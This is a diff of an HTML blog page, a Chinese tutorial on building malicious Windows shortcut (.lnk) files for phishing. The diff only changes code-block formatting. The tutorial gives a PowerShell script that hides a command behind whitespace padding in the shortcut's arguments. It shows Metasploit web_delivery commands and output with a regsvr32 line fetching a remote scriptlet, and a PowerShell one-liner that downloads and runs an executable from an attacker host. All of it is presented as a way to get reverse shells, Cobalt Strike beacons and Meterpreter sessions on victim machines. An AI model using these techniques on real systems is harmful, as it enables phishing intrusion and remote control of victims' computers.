@@ -151,40 +151,16 @@
 
   <div class="content" itemprop="articleBody">
     <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>关于windows快捷方式,想必这里就不用再多说了,大家应该已经非常了解才是,说白点,它其实就是一种路径映射而已,而我们利用的也正是这种特性,触发细节很简单,这里不妨简单回顾下,当我们双击打开一个windows快捷方式时内部到底都发生了些什么,首先,windows会根据快捷方式中指定的路径去触发执行相应的程序,假如我们指向的是一个包含恶意的payload路径,那结果就可想而知,payload肯定会被正常执行</p>
-<h2 id="0x01-生成快捷方式"><a href="#0x01-生成快捷方式" class="headerlink" title="0x01 生成快捷方式"></a>0x01 生成快捷方式</h2><p>新建 test.txt 文件，内容如下：</p>
-<pre><code>cmd /c calc
-</code></pre><p>新建 test.ps1 文件，右键powershell运行</p>
-<pre><code>$file = Get-Content &quot;test.txt&quot;
-$WshShell = New-Object -comObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut(&quot;test.lnk&quot;)
-$Shortcut.TargetPath = &quot;%SystemRoot%\system32\cmd.exe&quot;
-$Shortcut.IconLocation = &quot;%SystemRoot%\System32\Shell32.dll,21&quot;
-$Shortcut.Arguments = &#39;                                                                                                                                                                                                                                    &#39;+ $file
-$Shortcut.Save()
-</code></pre><p>生成 test.lnk 文件，而且图标改了（powershell执行文件要和test.txt要在一个目录下，这个图标所在位置就在%SystemRoot%\System32\Shell32.dll目录下）</p>
+<h2 id="0x01-生成快捷方式"><a href="#0x01-生成快捷方式" class="headerlink" title="0x01 生成快捷方式"></a>0x01 生成快捷方式</h2><p>新建 test.txt 文件，内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c calc</span><br></pre></td></tr></table></figure></p>
+<p>新建 test.ps1 文件，右键powershell运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$file = Get-Content &quot;test.txt&quot;</span><br><span class="line">$WshShell = New-Object -comObject WScript.Shell</span><br><span class="line">$Shortcut = $WshShell.CreateShortcut(&quot;test.lnk&quot;)</span><br><span class="line">$Shortcut.TargetPath = &quot;%SystemRoot%\system32\cmd.exe&quot;</span><br><span class="line">$Shortcut.IconLocation = &quot;%SystemRoot%\System32\Shell32.dll,21&quot;</span><br><span class="line">$Shortcut.Arguments = &apos;                                                                                                                                                                                                                                    &apos;+ $file</span><br><span class="line">$Shortcut.Save()</span><br></pre></td></tr></table></figure></p>
+<p>生成 test.lnk 文件，而且图标改了（powershell执行文件要和test.txt要在一个目录下，这个图标所在位置就在%SystemRoot%\System32\Shell32.dll目录下）</p>
 <p>双击 test.lnk ，调用计算器<br><img src="/2019/11/09/gou-zao-windows-kuai-jie-fang-shi-diao-yu-xin/1.png" alt=""></p>
 <h2 id="0x02-借助windows快捷方式实现beacon上线"><a href="#0x02-借助windows快捷方式实现beacon上线" class="headerlink" title="0x02 借助windows快捷方式实现beacon上线"></a>0x02 借助windows快捷方式实现beacon上线</h2><p>先创建一个powershell的payload</p>
 <p>Attacks –&gt; Packages –&gt; payload Generator<br><img src="/2019/11/09/gou-zao-windows-kuai-jie-fang-shi-diao-yu-xin/2.png" alt=""></p>
 <p>将生成的代码替换掉 calc，运行 test.ps1，生成 test.lnk<br>双击 test.lnk，反弹shell<br><img src="/2019/11/09/gou-zao-windows-kuai-jie-fang-shi-diao-yu-xin/3.png" alt=""></p>
-<h2 id="0x02-借助windows快捷方式实现meterpreter上线"><a href="#0x02-借助windows快捷方式实现meterpreter上线" class="headerlink" title="0x02 借助windows快捷方式实现meterpreter上线"></a>0x02 借助windows快捷方式实现meterpreter上线</h2><p>先用msf去生成payload</p>
-<pre><code>msf &gt; use exploit/multi/script/web_delivery 
-msf &gt; set target  3
-msf &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns 
-msf &gt; set lhost 192.168.3.29
-msf &gt; set lport 82
-msf &gt; set rc4password  klionsec
-msf exploit(multi/script/web_delivery) &gt; exploit -j
-[*] Exploit running as background job 0.
-
-[*] Started reverse TCP handler on 192.168.3.29:82 
-msf exploit(multi/script/web_delivery) &gt; [*] Using URL: http://0.0.0.0:8080/qQJvcDScrbA
-[*] Local IP: http://192.168.3.29:8080/qQJvcDScrbA
-[*] Server started.
-[*] Run the following command on the target machine:
-regsvr32 /s /n /u /i:http://192.168.3.29:8080/qQJvcDScrbA.sct scrobj.dll    将此命令单独写到meter.txt文件中去生成快捷方式
-</code></pre><p>生成快捷方式，双击执行</p>
-<h2 id="0x03-借助windows快捷方式实现自定义木马上线"><a href="#0x03-借助windows快捷方式实现自定义木马上线" class="headerlink" title="0x03 借助windows快捷方式实现自定义木马上线"></a>0x03 借助windows快捷方式实现自定义木马上线</h2><pre><code>powershell.exe (New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.72.23//PsExec.exe&#39;,&#39;c:\\temp\\PsExec.exe&#39;);(New-Object -com Shell.Application).ShellExecute(&#39;c:\\temp\\PsExec.exe&#39;)
-</code></pre>
+<h2 id="0x02-借助windows快捷方式实现meterpreter上线"><a href="#0x02-借助windows快捷方式实现meterpreter上线" class="headerlink" title="0x02 借助windows快捷方式实现meterpreter上线"></a>0x02 借助windows快捷方式实现meterpreter上线</h2><p>先用msf去生成payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery </span><br><span class="line">msf &gt; set target  3</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns </span><br><span class="line">msf &gt; set lhost 192.168.3.29</span><br><span class="line">msf &gt; set lport 82</span><br><span class="line">msf &gt; set rc4password  klionsec</span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.3.29:82 </span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; [*] Using URL: http://0.0.0.0:8080/qQJvcDScrbA</span><br><span class="line">[*] Local IP: http://192.168.3.29:8080/qQJvcDScrbA</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">regsvr32 /s /n /u /i:http://192.168.3.29:8080/qQJvcDScrbA.sct scrobj.dll	将此命令单独写到meter.txt文件中去生成快捷方式</span><br></pre></td></tr></table></figure></p>
+<p>生成快捷方式，双击执行</p>
+<h2 id="0x03-借助windows快捷方式实现自定义木马上线"><a href="#0x03-借助windows快捷方式实现自定义木马上线" class="headerlink" title="0x03 借助windows快捷方式实现自定义木马上线"></a>0x03 借助windows快捷方式实现自定义木马上线</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe (New-Object System.Net.WebClient).DownloadFile(&apos;http://192.168.72.23//PsExec.exe&apos;,&apos;c:\\temp\\PsExec.exe&apos;);(New-Object -com Shell.Application).ShellExecute(&apos;c:\\temp\\PsExec.exe&apos;)</span><br></pre></td></tr></table></figure>
   </div>
 </article>
 
